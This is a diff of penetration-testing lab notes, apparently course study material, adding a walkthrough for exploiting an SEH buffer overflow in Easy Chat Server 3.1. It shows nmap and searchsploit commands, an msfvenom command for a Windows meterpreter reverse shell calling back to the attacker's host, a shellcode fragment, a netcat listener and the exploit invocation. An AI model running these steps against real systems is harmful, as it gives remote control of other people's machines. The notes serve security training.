@@ -1254,7 +1254,23 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     ```
   - `cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg`  
   - `python2 46481.py http://192.168.171.46/seclab/`  
-  - `cat /var/www/http/seclab/php/flag.txt`  
+  - `cat /var/www/http/seclab/php/flag.txt`
+- **Capstone lab**: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
+  - `nmap -sVC -p- -v -T4 -sT --open 192.168.171.213`: 20000/tcp open  http  Easy Chat Server httpd 1.0
+  - `searchsploit Easy Chat Server`: [Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/50999)  
+  - Generate shellcode  
+   - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`
+  - Modify shellcode
+    ```
+    shellcode = b"\x90" * 16
+    shellcode += b"\xbe\xb6\x52\x38\xbc\xda\xc1\xd9\x74\x24\xf4"
+    ...
+
+    buffer += b"Host: 192.168.171.213:20000\r\n"   #target ip+port
+    buffer += b"Referer: http://192.168.171.213\r\n"
+    ```
+  - Start netcat listener: `nc -lvnp 443`
+  - Exploit `python2 easychat_50999.py 192.168.171.213 20000`  
 
 ### Password Attacks  
 - 16.1.1 SSH and RDP
